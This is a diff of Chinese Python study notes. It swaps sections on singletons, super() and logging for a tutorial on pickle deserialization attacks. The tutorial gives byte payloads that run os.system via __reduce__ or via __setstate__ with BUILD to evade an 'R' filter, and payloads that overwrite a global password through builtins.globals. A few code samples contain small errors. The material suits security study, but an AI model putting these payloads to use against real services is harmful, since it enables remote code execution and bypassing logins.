+    def __getstate__(self):
+        state = self.__dict__.copy()
+        # 不序列化 y 属性
+        del state['y']
+        return state
+
+    def __setstate__(self, state):
+        self.__dict__.update(state)
+
+point = Point(1, 2)
+
+# 序列化对象
+serialized = pickle.dumps(point)
+
+# 反序列化对象
+deserialized = pickle.loads(serialized)
+
+print(deserialized.x)  # 输出: 1
+print(deserialized.y)  # 抛出 AttributeError: 'Point' object has no attribute 'y'
+```
+
+在上面的示例中，我们在 `__getstate__()` 方法中删除了 `y` 属性，因此在序列化过程中只有 `x` 属性被保存。在反序列化后，我们可以看到 `y` 属性不存在。
+
+总结起来，通过实现 `__getstate__()` 方法，你可以自定义对象的序列化过程，选择性地序列化属性，并在序列化过程中进行额外的处理。这使得你能够更好地控制对象的序列化行为。
+
+#### `__getnewargs__()`
+
+`__getnewargs__()` 方法是 Python 中的一个特殊方法，用于与 `__new__()` 方法配合，自定义对象的序列化和反序列化行为。序列化是将对象的状态转换为字节流的过程，而反序列化是从字节流中重建对象的过程。
+
+当对象被序列化时，会调用 `__getnewargs__()` 方法来确定在反序列化过程中传递给对象的 `__new__()` 方法的参数。这样可以控制对象在反序列化时的重建方式。
+
+下面是一个示例，演示了 `__getnewargs__()` 方法的用法：
+
+```python
+import pickle
+
+class Point:
+    def __init__(self, x, y):
+        self.x = x
+        self.y = y
+
+    def __getnewargs__(self):
+        return (self.x, self.y)
+
+    def __new__(cls, x, y):
+        return super().__new__(cls)
+
+    def __repr__(self):
+        return f"Point({self.x}, {self.y})"
+
+# 创建一个 Point 对象
+p1 = Point(1, 2)
+print(p1)  # 输出: Point(1, 2)
+
+# 序列化对象
+data = pickle.dumps(p1)
+
+# 反序列化对象
+p2 = pickle.loads(data)
+print(p2)  # 输出: Point(1, 2)
+```
+
+在上面的示例中，`Point` 类定义了 `__getnewargs__()` 方法，它返回包含参数 `(self.x, self.y)` 的元组。在反序列化过程中，将使用这些参数调用 `__new__()` 方法来创建 `Point` 类的新实例。
+
+如果未定义 `__getnewargs__()` 方法，那么`__new__()`方法不会被传入任何参数
+
+```python
+import pickle
+
+class Point:
+    def __init__(self, x, y):
+        self.x = x
+        self.y = y
+
+  # def __getnewargs__(self):
+      # return (self.x, self.y)
+
+    def __new__(cls, x, y):
+        return super().__new__(cls)
+
+    def __repr__(self):
+        return f"Point({self.x}, {self.y})"
+
+# 创建一个 Point 对象
+p1 = Point(1, 2)
+print(p1) 
+
+# 序列化对象
+data = pickle.dumps(p1)
+
+# 反序列化对象
+p2 = pickle.loads(data)
+print(p2)
+
+
+'''
+Point(1, 2)
+Traceback (most recent call last):
+  File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 69, in <module>
+    p2 = pickle.loads(data)
+TypeError: __new__() missing 2 required positional arguments: 'x' and 'y'
+'''
+```
+
+```python
+import pickle
+
+class Point:
+    def __init__(self, x, y):
+        self.x = x
+        self.y = y
+
+  # def __getnewargs__(self):
+      # return (self.x, self.y)
+
+    def __new__(cls, x, y):
+        print("__new()__  ->  " + repr(args))
+        return super().__new__(cls)
+
+    def __repr__(self):
+        return f"Point({self.x}, {self.y})"
+
+# 创建一个 Point 对象
+p1 = Point(1, 2)
+print(p1)
+
+# 序列化对象
+data = pickle.dumps(p1)
+
+# 反序列化对象
+p2 = pickle.loads(data)
+print(p2)
+
+'''
+__new()__  ->  (1, 2)
+Point(1, 2)
+__new()__  ->  ()
+Point(1, 2)
+'''
+```
+
+>##### `__getnewargs_ex__()`
+>
+>限制：
+>
+>1. 对于使用 v2 版或更高版协议的 pickle 才能使用此方法
+>2. 必须返回一对 `(args, kwargs)` 用于构建对象，其中 `args` 是表示位置参数的 tuple，而 `kwargs` 是表示命名参数的 dict
+>
+>`__getnewargs_ex__()` 方法 return 的值，会在解封时传给 `__new__()` 方法的作为它的参数。
+>
+>##### `__getnewargs__()`
+>
+>限制：
+>
+>1. 必须返回一个 tuple 类型的 `args`
+>2. 如果定义了 `__getnewargs_ex__()`，那么 `__getnewargs__()` 就不会被调用。
+>
+>这个方法与上一个 `__getnewargs_ex__()` 方法类似，但只支持位置参数。
+>
+>注：在 Python 3.6 前，v2、v3 版协议会调用 `__getnewargs__()`，更高版本协议会调用 `__getnewargs_ex__()`
+
+### 构造反序列化payload
+
+>https://github.com/Macr0phag3/souse
+>
+>#### 注意事项
+>
+>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
+>
+>```
+># linux(注意posix):
+>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>
+># windows(注意nt):
+>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>```
+
+#### 全局引入
+
+```python
+import secret
+
+class Target:
+    def __init__(self):
+        obj = pickle.loads(ser)  # 输入点
+        if obj.pwd == secret.pwd:
+            print("Hello, admin!")
+```
+
+exp
+
+```python
+import pickle
+import pickletools
+
+class secret:
+    pwd = "???"
+
+class Target:
+    def __init__(self):
+        self.pwd = secret.pwd
+
+test = Target()
+
+serialized = pickletools.optimize(pickle.dumps(test, protocol=3))
+print(serialized)
+pickletools.dis(serialized)
+'''
 结果
-add_method_to_class
-Hello from the class method!
+b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdX\x03\x00\x00\x00???sb.'
+
+payload
+b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'
+'''
+
+pickletools.dis(pickletools.optimize(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'))
+print('pickle pwd -> ' + pickle.loads(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.').pwd)
+```
+
+```Python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 2023/10/17 20:35
+# @Author  : wi1111
+# @File    : pickle_demo.py
+# @Software: PyCharm python3.9
+import pickle
+import pickletools
+
+"""
+import secret
+
+class Target:
+    def __init__(self):
+        obj = pickle.loads(ser)  # 输入点
+        if obj.pwd == secret.pwd:
+            print("Hello, admin!")
+"""
+
+class secret:
+    pwd = "???"
+
+class Target:
+    def __init__(self):
+        self.pwd = secret.pwd
+
+test = Target()
+
+serialized = pickletools.optimize(pickle.dumps(test, protocol=0))
+print(serialized)
+pickletools.dis(serialized)
+
+# 结果
+# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.'
+
+# payload
+# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.'
+```
+
+#### 引入魔术方法
+
+```python
+class Target:
+    def __init__(self):
+        ser = ""  # 输入点
+        if "R" in ser:
+            print("Hack! <=@_@")
+        else:
+            obj = pickle.loads(ser)
+```
+
+先看常规payload
+
+```python
+class exp_demo:
+
+    def __reduce__(self):
+        import os
+        return os.system, ('whoami', )
+print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
+pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
+# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
+```
+
+对于这个例子来说，要想 RCE，需要过这里的 if，也就是不能用 `R`。
+
+这 R 如何去除呢？`b` 就派上用场了。
+
+```Python
+class exp_demo:
+
+    def __init__(self):
+        import os
+        self.__setstate__ = os.system
+
+    # def __reduce__(self):
+    #     import os
+    #     return os.system, ('whoami', )
+
+print('2————————————————————————————————————————————————————————————————————————')
+print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
+pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
+# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
+# 自动生成paylaod：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsb.'
+# payload：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsbVwhoami\nb.'
+
+# 你会发现里面还是存在R用于构建实例，这时候就要更换版本，利用\x81来创建实例
+# \x81 其实就是通过 cls.__new__ 来创建一个实例，需要栈顶有 args（元组） 和 kwds（字典）。
+print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
+pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
+"""
+b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsb.'
+    0: \x80 PROTO      3
+    2: c    GLOBAL     '__main__ exp_demo'
+   21: )    EMPTY_TUPLE
+   22: \x81 NEWOBJ
+   23: }    EMPTY_DICT
+   24: X    BINUNICODE '__setstate__'
+   41: c    GLOBAL     'nt system'
+   52: s    SETITEM
+   53: b    BUILD
+   54: .    STOP
+highest protocol among opcodes = 2
+
+payload：b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
 """
 ```
 
-## Python实现单例模式
+回顾一下它的作用：使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性/方法的设置。既然可以设置实例的方法，那么能不能设置一个方法让它在反序列化的时候自动运行呢？什么方法会在反序列化的时候自动运行，答案是上面提到的 `__setstate__()`。
 
-### 1. 使用函数装饰器
+所以，我们只需要令 `__setstate__ = os.system`，再把参数传入即可：
 
-```python
-from functools import wraps
-
-def singleton(cls):
-    instances = {}
-    @wraps(cls)
-    def wrapper(*args, **kwargs):
-        if cls not in instances:
-            instances[cls] = cls(*args, **kwargs)
-        return instances[cls]
-    return wrapper
-
-# 1部分
-@singleton
-class MyClass:
-    pass
-
-# 2部分
-MyClass()
-MyClass()
-MyClass()
+```
+b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
+    0: \x80 PROTO      3
+    2: c    GLOBAL     '__main__ exp_demo'
+   21: )    EMPTY_TUPLE
+   22: \x81 NEWOBJ
+   23: }    EMPTY_DICT
+   24: X    BINUNICODE '__setstate__'
+   41: c    GLOBAL     'nt system'
+   52: s    SETITEM
+   53: b    BUILD
+   54: V    UNICODE    'whoami'
+   62: b    BUILD
+   63: .    STOP
+highest protocol among opcodes = 2
+修改步骤就是在自动生成的payload上第一次b构建完成后，此时__setstate__已经不再是None，只需再次构建传进参数即可调用到__setstate__。
 ```
 
->调用装饰器的阶段是在类的定义阶段而不是对类进行实例化的阶段，所以在1部分的时候将类传进装饰器函数`singleton`中，而不是在2部分才将类传进装饰器函数，所以在定义阶段，`MyClass`就已经被赋成`singleton`里面的`wrapper`函数，这就导致`wrapper`在会被分配内存，从而使其中的变量`instances`一直存在
+![image-20231018002948755](daydayup.assets/image-20231018002948755.png)
+
+>### BINUNICODE操作码
 >
+>BINUNICODE = b'X' 这个操作码的含义是将一个Unicode字符串压入pickle的数据栈中，这个Unicode字符串是一个以UTF-8编码的字符串。
 >
+>"counted UTF-8 string argument"指的是：这个操作码后面跟着的数据是一个计数的UTF-8字符串，即首先有一个整数表示字符串的长度，然后是实际的字符串数据。这种格式可以让pickle知道在读取字符串时应读取多少字节。
 >
->在这段代码中，`instances`是`singleton`函数的局部变量，但由于Python的闭包特性，它会在`singleton`函数返回的`wrapper`函数中被保留下来。
+>至于如何触发这个操作码，当你尝试pickle一个包含Unicode字符串的Python对象时，这个操作码就会被触发。例如：
 >
->闭包是指一种函数，它记住了自己被定义时的环境。在这个例子中，`wrapper`函数就是一个闭包，它记住了`singleton`函数的环境，包括`instances`这个变量。所以，即使`singleton`函数运行完成之后，`instances`变量并不会被销毁，而是会被`wrapper`函数持续引用。
+>```python
+>import pickle
 >
->当你下一次实例化`MyClass`的时候，`wrapper`会被调用，`instances`里依然会存在上次存储的类实例。这是因为`instances`是一个字典，用于存储已经实例化过的类和对应的实例。当你尝试实例化一个类时，`wrapper`首先会检查这个类是否已经在`instances`中，如果是，就直接返回对应的实例；否则，它会创建一个新的实例，存入`instances`，然后返回这个新的实例。这就是所谓的单例模式，保证一个类只有一个实例。
+>data = {'key': '这是一个Unicode字符串'}
+>pickle.dumps(data)
+>```
 >
->所以，虽然`instances`在`singleton`函数中定义为局部变量，但由于闭包的特性，它在函数运行完成后并不会被销毁，而是会被保留下来，用于在后续的类实例化中保证单例模式。
+>在这个例子中，当pickle模块尝试序列化这个字典时，会使用BINUNICODE操作码来处理值为Unicode字符串的部分。
+>
+>所以可以看到`V`需要最后使用`\n`来分割，而`X`因为有前四个字节表示字符串长度，所以无需在最后使用`\n`来分割。
+>![image-20231018004135499](daydayup.assets/image-20231018004135499.png)
+>
+>`BINUNICODE`操作码在Python的pickle协议中用于表示长度为4字节的Unicode字符串。这意味着它可以表示长度为2^32-1的字符串。如果字符串长度超出这个范围，那么pickle模块会使用不同的操作码来处理这种情况。
+>
+>在Python的pickle协议中，有一个叫做`BINUNICODE8`的操作码，这个操作码用于处理长度超过4字节的Unicode字符串。`BINUNICODE8`操作码可以处理长度为2^64-1的字符串，这个长度远远超过了大多数实际使用情况的需求。
+>
+>所以，如果你尝试pickle一个长度超过`BINUNICODE`可以表示的字符串，Python的pickle模块会自动使用`BINUNICODE8`操作码来处理这种情况，你不需要手动进行任何操作。
 
-### 2. 使用基类
-
-使用基类 way实现单例,类继承该基类即可:
-
-*[这里](#元类)
-
-```python
-class Singleton(type):
-    def __init__(cls, name, bases, dict):
-        super(Singleton, cls).__init__(name, bases, dict)
-        cls._instance = None 
-
-    def __call__(cls, *args, **kw):
-        if cls._instance is None:
-            cls._instance = super(Singleton, cls).__call__(*args, **kw)
-        return cls._instance
-
-class Foo(metaclass=Singleton):
-    ...
-```
-
-### 3. 模块级实例
-
-因为模块天然是单例的,可以直接实现:
+####  变量与方法覆盖
 
 ```python
-# foo.py
-class Foo:
-  ...
+PWD = "???"  # 已打码
 
-instance = Foo()
-```
+class Target2_test:
+    PWD_TEST = 111
 
-导入这个模块的其它地方都可以访问instance。
-
-### 4. 共享属性
-
-类的属性是共享的,可以用于单例:
-
-```python
-class Foo(object):
-    _instance = None
-    
-    def __new__(cls):
-        if not cls._instance:
-            cls._instance = super(Foo, cls).__new__(cls)
-        return cls._instance
-```
-
-这些是 Python 实现单例的一些常见方式。每种方式有不同的优劣,可以根据需求选择。
-
-## Python super函数的理解
-
-### MRO
-
-方法解析顺序（Method Resolution Order），简称 MRO
-
-Python 发展至今，经历了以下 3 种 MRO 算法，分别是：
-
-1. 从左往右，采用深度优先搜索（DFS）的算法，称为旧式类的 MRO；
-2. 自 Python 2.2 版本开始，新式类在采用深度优先搜索算法的基础上，对其做了优化；
-3. 自 Python 2.3 版本，对新式类采用了 C3 算法。由于 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法。
-
-#### 旧式类MRO算法
-
-在使用旧式类的 MRO 算法时，以下面代码为例:
-
-```python
-class A:
-    def method(self):
-        print("CommonA")
-class B(A):
-    pass
-class C(A):
-    def method(self):
-        print("CommonC")
-class D(B, C):
-    pass
-
-D().method()
-```
-
-通过分析可以想到，此程序中的 4 个类是一个“菱形”继承的关系，当使用 D 类对象访问 method() 方法时，根据深度优先算法，搜索顺序为`D->B->A->C->A`。
-
-旧式类的 MRO 可通过使用`inspect`模块中的`getmro(类名)`函数直接获取。例如 `inspect.getmro(D)` 表示获取 D 类的 MRO。
-
-因此，使用旧式类的 MRO 算法最先搜索得到的是基类 A 中的`method()`方法，即在 Python 2.x 版本中，此程序的运行结果为：
-
-```
-CommonA
-```
-
-但是，这个结果显然不是想要的，我们希望搜索到的是 C 类中的`method()`方法。
-
-#### 新式类MRO算法
-
-为解决旧式类 MRO 算法存在的问题，Python 2.2 版本推出了新的计算新式类 MRO 的方法，它仍然采用从左至右的深度优先遍历，但是如果遍历中出现重复的类，只保留最后一个。
-
-仍以上面程序为例，通过深度优先遍历，其搜索顺序为`D->B->A->C->A`，由于此顺序中有 2 个 A，因此仅保留后一个，简化后得到最终的搜索顺序为`D->B->C->A`。
-
-新式类可以直接通过 `类名.__mro__ `的方式获取类的 MRO，也可以通过 `类名.mro()` 的形式，旧式类是没有` __mro__` 属性和`mro() `方法的。
-
-可以看到，这种 MRO 方式已经能够解决“菱形”继承的问题，但是可能会违反单调性原则。所谓单调性原则，是指在类存在多继承时，子类不能改变基类的 MRO 搜索顺序，否则会导致程序发生异常。
-
-例如，分析如下程序：
-
-```python
-class X(object):
-    pass
-class Y(object):
-    pass
-class A(X,Y):
-    pass
-class B(Y,X):
-    pass
-class C(A, B):
-    pass
-```
-
-通过进行深度遍历，得到搜索顺序为`C->A->X->object->Y->object->B->Y->object->X->object`，再进行简化（相同取后者），得到`C->A->B->Y->X->object`
-
-下面来分析这样的搜索顺序是否合理，我们来看下各个类中的 MRO：
-
-- 对于 A，其搜索顺序为 A->X->Y->object；
-- 对于 B，其搜索顺序为 B->Y->X->object；
-- 对于 C，其搜索顺序为 C->A->B->X->Y->object。
-
-可以看到，B 和 C 中，X、Y 的搜索顺序是相反的，也就是说，当 B 被继承时，它本身的搜索顺序发生了改变，这违反了单调性原则。
-
-#### MRO C3
-
-[为解决 Python 2.2 中 MRO 所存在的问题，Python 2.3 采用了 C3 方法来确定方法解析顺序。多数情况下，如果某人提到 Python 中的 MRO，指的都是 C3 算法。那么，C3 算法是怎样实现的呢？](https://www.zhihu.com/tardis/zm/art/416584599?source_id=1005)
-
-### super函数
-
-在Python中，`super()`函数常用于调用父类（超类）的方法。这个函数有两种常见的使用方式：一种是在子类中调用父类的方法，另一种是在任何地方调用指定类的父类或兄弟类的方法。下面我将详细解释四种情况：
-
-1. `super()`不传参数：这种情况下，`super()`通常在类的方法内部使用，用来引用父类的方法。这种方式下，Python会自动将`self`和当前的类传给`super()`。例如：
-
-   ```python
-   class MyParentClass(object):
-       def __init__(self):
-           print("Parent init")
-   
-   class SubClass(MyParentClass):
-       def __init__(self):
-           super().__init__()
-           print("Subclass init")
-   ```
-
-   在这个例子中，`SubClass`的`__init__`方法通过`super().__init__()`调用了`MyParentClass`的`__init__`方法。
-
-2. `super()`传一个参数：`super()`只传递一个参数时，是一个不绑定的对象，不绑定的话它的方法是不会有用的
-
-   ```python
-   class Base:
-       def __init__(self):
-           print('Base.__init__')
-   
-   class B(Base):
-       def __init__(self):
-           super().__init__()
-           print('B.__init__')
-   
-   class C(Base):
-       def __init__(self):
-           super().__init__()
-           print('C.__init__')
-   
-   
-   class D(B, C):
-       def __init__(self):
-           super(B).__init__()  # 值传递一个参数
-           print('D.__init__')
-   
-   D()
-   
-   print(D.mro())
-   """
-   结果
-   D.__init__
-   [<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.Base'>, <class 'object'>]
-   """
-   ```
-
-   
-
-3. `super()`传一个类对象和一个实例对象参数：在这种情况下，`super(class, obj)`函数将返回一个临时对象，这个对象绑定的是指定类的父类或兄弟类的方法。obj必须是class的实例或者是子类的实例。例如：
-
-   ```python
-   class A:
-       def __init__(self):
-           print("A's init invoked")
-   
-   class B(A):
-       def __init__(self):
-           print("B's init invoked")
-   
-   class C(B):
-       def __init__(self):
-           print("C's init invoked")
-           super(B, self).__init__()
-   
-   c = C()
-   ```
-
-   在这个例子中，`C`的`__init__`方法通过`super(B, self).__init__()`调用了`A`的`__init__`方法，而不是`B`的`__init__`方法。
-
-4. `super()`传两个类对象参数：`super(class1, class2) `这种情况下，第一个参数通常是子类，第二个参数是父类，用于获取子类的兄弟类。这种用法比较少见，但在处理复杂的类继承关系时可能会用到。例如：
-
-   ```python
-   class A:
-       def who_am_i(self):
-           print("I am A")
-   
-       @staticmethod
-       def shout():
-           print('shout A')
-   
-   class B(A):
-       def who_am_i(self):
-           print("I am B")
-   
-       @staticmethod
-       def shout():
-           print('shout B')
-   
-   class C(A):
-       def who_am_i(self):
-           print("I am C")
-   
-       @staticmethod
-       def shout():
-           print('shout C')
-   
-   class D(B, C):
-       def who_am_i(self):
-           print("I am D")
-           print('super(B, D).who_am_i -> ' + str(type(super(B, D).who_am_i)))
-           print('super(B, self).who_am_i -> ' + str(type(super(B, self).who_am_i)))
-           super(B, D).who_am_i(self)
-           super(B, D).shout()
-           super(B, self).who_am_i()
-   
-   d = D()
-   d.who_am_i()
-   """
-   结果
-   I am D
-   super(B, D).who_am_i -> <class 'function'>
-   super(B, self).who_am_i -> <class 'method'>
-   I am C
-   shout C
-   I am C
-   """
-   ```
-
-   在这个例子中，`D`的`who_am_i`方法通过`super(B, self).who_am_i()`调用了`C`的`who_am_i`方法，而不是`B`的`who_am_i`方法。`super()`传递两个类class1和class2时，得到的也是一个绑定的super对象，但这需要class2是class1的子类，且如果调用的方法需要传递参数时，必须手动传入参数，因为super()第二个参数是类时，得到的方法是函数类型的，使用时不存在自动传参，第二个参数是对象时，得到的是绑定方法，可以自动传参。
-
-super本身其实就是一个类，`super()`其实就是这个类的实例化对象，它需要接收两个参数 `super(class, obj)`,它返回的是`obj`的MRO中`class`类的父类，举个例子：
-
-```python
-class Base:
+class Target:
     def __init__(self):
-        print('Base.__init__')
+        obj = pickle.loads(ser)  # 输入点
+        if obj.pwd == PWD:
+            print("Hello, admin!")
+            
+            
+# import builtins
+# builtins.globals()["PWD"] = ""  # 先把 PWD 改成一个值
+# obj.pwd = ""  # 再让 obj.pwd 也等于这个值
+# print(__import__('builtins').globals())
 
-class A(Base):
-    def __init__(self):
-        super().__init__()
-        print('A.__init__')
-
-class B(Base):
-    def __init__(self):
-        super().__init__()
-        print('B.__init__')
-
-
-class C(Base):
-    def __init__(self):
-        super().__init__()
-        print('C.__init__')
-
-class D(A, B, C):
-    def __init__(self):
-        super(B, self).__init__()  # self是B的子类D的实例
-        print('D.__init__')
-
-D()
-print(D.mro())
+# payload: b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
+payload2 = b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
+print(payload2)
+pickletools.dis(payload2)
+Target2(payload2)
 """
-Base.__init__
-C.__init__
-D.__init__
-[<class '__main__.D'>, <class '__main__.A'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.Base'>, <class 'object'>]
+b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
+    0: \x80 PROTO      3
+    2: c    GLOBAL     'builtins globals'
+   20: )    EMPTY_TUPLE
+   21: R    REDUCE
+   22: (    MARK
+   23: V        UNICODE    'PWD'
+   28: V        UNICODE    'wi1'
+   33: u        SETITEMS   (MARK at 22)
+   34: 0    POP
+   35: c    GLOBAL     '__main__ Target2'
+   53: )    EMPTY_TUPLE
+   54: \x81 NEWOBJ
+   55: }    EMPTY_DICT
+   56: (    MARK
+   57: V        UNICODE    'pwd'
+   62: V        UNICODE    'wi1'
+   67: u        SETITEMS   (MARK at 56)
+   68: b    BUILD
+   69: .    STOP
+highest protocol among opcodes = 2
+"""
+
+
+# 获取到 Target2_test 类的内部的值，利用i
+# payload: b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
+print(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')
+pickletools.dis(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')
+
+
+print(pickle.loads(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'))
+"""
+b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
+    0: (    MARK
+    1: c        GLOBAL     '__main__ Target2_test'
+   24: V        UNICODE    'PWD_TEST'
+   34: i        INST       'builtins getattr' (MARK at 0)
+   52: .    STOP
+highest protocol among opcodes = 0
 """
 ```
 
-`super(B, self).__init__()`:
+通过`import builtins`，利用其中的`globals`覆盖`PWD`，然后再用`0`弹出栈里的 `builtins.globals()` ，因为`builtins.globals()`是一个字典没有办法利用`.`来获取值也就是没有`__getattribute__`方法，所以再压入一个`Target2`实例，然后利用`\x81`来实例化对象，再用`b`给其附上属性`pwd`的值，就完成了覆盖
 
-`super`的作用是 **返回的是`obj`的MRO中`class`类的父类**,在这里就表示**返回的是`D`（也就是`self`）的MRO中`B`类的父类**：
+如果要获取一个对象或者类的属性，可以使用`i`来获取，通过调用内置方法中的`getattr`来获取到某个对象或者类中的属性。
 
-1. 返回的是`d`的MRO：`(D, A, B, C, Base, object)`
-2. 中`B`类的父类：`C`
+当然，方法也是可以进行覆盖的
 
-## hebust教务系统逆向
+>### `sys.modules`
+>
+>`sys.modules` 是一个 Python 内置模块 `sys` 中的字典，它保存了当前解释器中已经导入的所有模块的引用。
+>
+>当你在 Python 中导入一个模块时，解释器会在 `sys.modules` 中查找该模块的引用。如果模块已经存在于 `sys.modules` 中，解释器会直接使用该引用，而不会重新加载模块。这样可以避免多次导入同一个模块，提高了导入的效率。
+>
+>`sys.modules` 中的模块引用是动态更新的。当你导入新的模块或重新加载模块时，`sys.modules` 会相应地更新。
+>
+>`sys.modules` 的键是模块的名称，值是对应模块的引用。你可以使用 `sys.modules` 来查看当前解释器中已经导入的模块。
+>
+>### `builtins.globals`
+>
+>`builtins.globals` 是一个内置模块 `builtins` 下的字典，它保存了当前作用域中的全局变量和函数的引用。
+>
+>`builtins` 模块是 Python 解释器在启动时自动导入的模块，它包含了一些内置的函数、异常和对象。`builtins.globals` 是 `builtins` 模块中的一个字典，它提供了对当前全局命名空间中的对象的访问。
+>
+>通过 `builtins.globals`，你可以获取当前作用域中定义的全局变量和函数的引用。这些引用被存储在 `builtins.globals` 字典中，以变量名作为键，以对应的对象作为值。
+>
+>需要注意的是，`builtins.globals` 提供了对全局作用域中的对象的访问，而不是所有作用域中的对象。如果你在一个函数内部调用 `builtins.globals`，它将返回该函数所在的作用域中的全局对象。
 
+```Python
+import sys
+p0 = sys.modules
+p0["sys"] = p0
+import sys
+p0["sys"] = sys.get("os")
 ```
-https://github.com/wi1shu7/fuck_hebust_login
-```
+
+用 `dir()` 来查看属性和方法，其实它在参数不同的时候，查询的逻辑是不一样的：
+
+[![img](daydayup.assets/98a6e69c-927e-4960-ae87-e92636533d13.png)]()
+
+另外特别注意的是，有些对象的 `__dict__` 属于 `mappingproxy` 类型，例如类对象和类实例，如果直接用 `b` 对`mappingproxy` 类型进行属性修改的话，会抛出异常
 
 ```python
-# 模块化示例
-class InformationHandler:
-    def __init__(self):
-        self.modules = {}
-
-    def register_module(self, module_name, module_function):
-        self.modules[module_name] = module_function
-
-    def process_information(self, information):
-        # 假设信息格式为：-[模块] [参数1] [参数2] ...
-        info_list = information.split()
-        if len(info_list) < 2:
-            raise ValueError("信息格式不正确！")
-        
-        module_name = info_list[0][2:]  # 去掉前面的“-”
-        module_function = self.modules.get(module_name)
-        if module_function is None:
-            raise ValueError(f"找不到对应的模块：{module_name}")
-
-        arguments = info_list[1:]
-        return module_function(*arguments)
-
-# 示例模块函数
-def module_function_example(param1, param2):
-    return f"模块函数示例：参数1={param1}，参数2={param2}"
-
-if __name__ == "__main__":
-    handler = InformationHandler()
-    handler.register_module("模块名示例", module_function_example)
-
-    information1 = "-模块名示例 参数1 参数2"
-    result1 = handler.process_information(information1)
-    print(result1)  # 输出：模块函数示例：参数1=参数1，参数2=参数2
-
-```
-
-### logging模块基本使用
-
-转自：[https://www.cnblogs.com/wf-linux/archive/2018/08/01/9400354.html](https://www.cnblogs.com/wf-linux/archive/2018/08/01/9400354.html)
-配置logging基本的设置，然后在控制台输出日志，
-
-```python
-import logging
-logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
- 
-logger.info("Start print log")
-logger.debug("Do something")
-logger.warning("Something maybe fail.")
-logger.info("Finish")
-```
-
-运行时，控制台输出，
-
-    2016-10-09 19:11:19,434 - __main__ - INFO - Start print log
-    2016-10-09 19:11:19,434 - __main__ - WARNING - Something maybe fail.
-    2016-10-09 19:11:19,434 - __main__ - INFO - Finish
-
-logging中可以选择很多消息级别，如debug、info、warning、error以及critical。通过赋予logger或者handler不同的级别，开发者就可以只输出错误信息到特定的记录文件，或者在调试时只记录调试信息。
-
-例如，我们将logger的级别改为DEBUG，再观察一下输出结果，
-
-`logging.basicConfig(level = logging.DEBUG,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')`
-
-控制台输出，可以发现，输出了debug的信息。
-
-    2016-10-09 19:12:08,289 - __main__ - INFO - Start print log
-    2016-10-09 19:12:08,289 - __main__ - DEBUG - Do something
-    2016-10-09 19:12:08,289 - __main__ - WARNING - Something maybe fail.
-    2016-10-09 19:12:08,289 - __main__ - INFO - Finish
-
-`logging.basicConfig`函数各参数：
-
-`filename`：指定日志文件名；
-
-`filemode`：和file函数意义相同，指定日志文件的打开模式，'w'或者'a'；
-
-`format`：指定输出的格式和内容，format可以输出很多有用的信息，
-
-    参数：作用
-     
-    %(levelno)s：打印日志级别的数值
-    %(levelname)s：打印日志级别的名称
-    %(pathname)s：打印当前执行程序的路径，其实就是sys.argv[0]
-    %(filename)s：打印当前执行程序名
-    %(funcName)s：打印日志的当前函数
-    %(lineno)d：打印日志的当前行号
-    %(asctime)s：打印日志的时间
-    %(thread)d：打印线程ID
-    %(threadName)s：打印线程名称
-    %(process)d：打印进程ID
-    %(message)s：打印日志信息
-
-`datefmt`：指定时间格式，同time.strftime()；
-
-`level`：设置日志级别，默认为logging.WARNNING；
-
